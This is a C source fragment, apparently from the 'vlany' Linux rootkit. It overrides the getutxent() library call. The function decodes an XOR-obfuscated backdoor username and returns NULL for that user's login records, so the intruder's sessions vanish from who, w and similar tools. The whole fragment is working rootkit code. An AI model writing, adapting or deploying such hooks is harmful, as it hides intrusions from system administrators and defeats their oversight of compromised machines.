struct utmpx *getutxent(void)
{
    #ifdef DEBUG
        printf("[vlany] getutxent() called\n");
    #endif

    HOOK(old_getutxent, CGETUTXENT);

    struct utmpx *tmp;
    tmp = old_getutxent();

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user))
        {
            CLEAN(vlany_user);
            errno = ESRCH;
            return NULL;
        }
        CLEAN(vlany_user);
    }

    return tmp;
}
